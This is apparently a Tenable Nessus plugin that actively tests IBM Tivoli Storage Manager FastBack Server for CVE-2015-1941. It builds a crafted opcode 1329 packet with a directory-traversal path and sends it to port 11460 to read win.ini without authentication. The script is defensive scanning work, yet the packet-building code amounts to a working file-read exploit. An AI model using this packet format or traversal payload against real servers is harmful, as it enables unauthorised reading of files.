#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(91502);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/06/08 16:18:16 $");

  script_cve_id("CVE-2015-1941");
  script_bugtraq_id(75446);
  script_osvdb_id(123824);
  script_xref(name:"ZDI", value:"ZDI-15-268");

  script_name(english:"IBM Tivoli Storage Manager FastBack Server Opcode 1329 Information Disclosure");
  script_summary(english:"Attempts to read a file on the remote host.");

  script_set_attribute(attribute:"synopsis", value:
"A remote backup service is affected by an information disclosure 
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The IBM Tivoli Storage Manager FastBack Server running  on the remote
host is affected by an information disclosure vulnerability due to
improper processing of opcode 1329. An unauthenticated, remote
attacker can exploit this, by sending a crafted packet to TCP port
11460, to read the contents of arbitrary files.

Note that the FastBack Server running on the remote host is reportedly
affected by other vulnerabilities as well; however, this plugin has
not tested for them.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-15-268/");
  # http://www-01.ibm.com/support/docview.wss?uid=swg21959398
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bc221f52");
  script_set_attribute(attribute:"solution", value:
"Upgrade to IBM Tivoli Storage Manager FastBack version 6.1.12 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/05/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/07/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/06/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:tivoli_storage_manager_fastback");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("ibm_tsm_fastback_detect.nbin", "os_fingerprint.nasl");
  script_require_keys("IBM Tivoli Storage Manager FastBack Server", "Services/tsm-fastback");
  script_require_ports(11460);

  exit(0);
}

include("byte_func.inc");
include("misc_func.inc");
include("global_settings.inc");
include("audit.inc");
include("dump.inc");

function mkdword_le()
{
  local_var v;

  v = _FCT_ANON_ARGS[0];

  return mkdword(v, order: BYTE_ORDER_LITTLE_ENDIAN);
}

function mk_pkt(opcode, p1, p2, p3)
{
  local_var cmd_buf, cmd_hdr, pkt;

  if(isnull(opcode))
    return NULL;

  if(isnull(p1)) 
    p1 = crap(data:'P1', length:8);

  if(isnull(p2)) 
    p2 = crap(data:'P2', length:8);
     
  if(isnull(p3)) 
    p3 = crap(data:'P3', length:8);

  # psAgentCommand
  cmd_hdr = 
    crap(data:'UNK1', length:0x8) +       # ? 
    '\x00\x00\x00\x00' +                  # ptr to agent obj
    mkdword_le(opcode) +                  # command opcode 
    mkdword_le(0) +                       # p1 offset
    mkdword_le(strlen(p1)) +              # p1 size
    mkdword_le(strlen(p1)) +              # p2 offset
    mkdword_le(strlen(p2)) +              # p2 size
    mkdword_le(strlen(p1) + strlen(p2)) + # p3 offset
    mkdword_le(strlen(p3)) +              # p3 size
    '\x00\x00\x00\x00' +                  # command status 
    '\x00\x00\x00\x00';                   # ptr to psCommandBuffer
     
  # psCommandBuffer
  cmd_buf = p1 + p2 + p3;
  
  pkt = cmd_hdr + cmd_buf;      

  # Append pkt len
  pkt = mkdword(strlen(pkt)) + pkt;

  return pkt;
}

#
# MAIN
#

# Only Windows targets are affected.
# If we cannot determine the remote OS, we still perform the check.
os = get_kb_item('Host/OS');
if (!isnull(os) && 'Windows' >!< os)
  audit(AUDIT_OS_NOT, 'Windows');

port = get_service(svc:'tsm-fastback', default:11460, exit_on_fail:TRUE);
soc = open_sock_tcp(port);
if (!soc) 
  audit(AUDIT_SOCK_FAIL, port);

files = make_list('\\windows\\win.ini', '\\winnt\\win.ini');
file_pats['\\winnt\\win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['\\windows\\win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

opcode = 1329; 
foreach file (files)
{
  from    = 0;      # starting position of the byte range to retrieve 
  to      = 10000;  # ending position of the byte range to retrieve
  chunk_loc = 0;    # used for byte range locking? 
  file_loc  = 0;    # used for file locking? 
  # file path relative to C:\ProgramData\Tivoli\TSM\FastBack\server
  p1 = 'File: ' + '..\\..\\..\\..\\..\\..\\..\\..' + file +
       ' From: ' + from +
       ' To: ' + to +
       ' ChunkLoc: ' + chunk_loc +
       ' FileLoc: '  + file_loc;

  req = mk_pkt(opcode: opcode, p1: p1);
  send(socket:soc, data:req);
  res = recv(socket:soc,length: 0x4400);

  # Server should return something even for a non-existing file
  if(isnull(res)) 
    audit(AUDIT_RESP_NOT, port);
 
  # Server should return at least 4 bytes 
  if(strlen(res) < 4)
    audit(AUDIT_RESP_BAD, port, 'a request with opcode ' + opcode + ': response too short' );
   
  # Check response pkt length 
  if(getdword(blob:res, pos:0) != strlen(res) - 4)
    audit(AUDIT_RESP_BAD, port, 'a request with opcode ' + opcode + ': Invalid response packet length');

  res = substr(res, 4);
  if (egrep(pattern:file_pats[file], string:res))
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      file        : file,
      request     : make_list(hexdump(ddata:req)),
      output      : res,
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_LISTEN_NOT_VULN,'IBM Tivoli Storage Manager FastBack Server', port);
